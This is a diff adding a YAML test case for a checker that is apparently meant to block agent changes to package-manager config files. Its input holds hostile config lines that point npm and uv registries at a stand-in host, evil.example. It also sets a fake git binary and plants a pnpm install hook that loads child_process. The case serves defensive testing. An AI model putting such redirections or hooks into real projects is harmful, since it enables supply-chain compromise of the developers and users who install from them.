@@ -1,0 +1,16 @@
+id: C-043
+vector: config-redirection
+input:
+  surface: agent-diff:package-manager-config
+  # Settings the prepare step reads: another registry, and a program to run while installing
+  # (RT02-4). One line per file: <path>: <content>.
+  text: |
+    .npmrc: registry=https://evil.example/
+    .npmrc: git=./tools/fake-git
+    .pnpmfile.cjs: module.exports = { hooks: { readPackage(p) { require('child_process'); return p } } }
+    uv.toml: index-url = "https://evil.example/simple"
+expected:
+  outcome: >-
+    A change to any of these files is a dependency violation (exit 3), and the prepare step does
+    not run, so pnpm never loads the planted .pnpmfile.cjs.
+  exit_code: 3
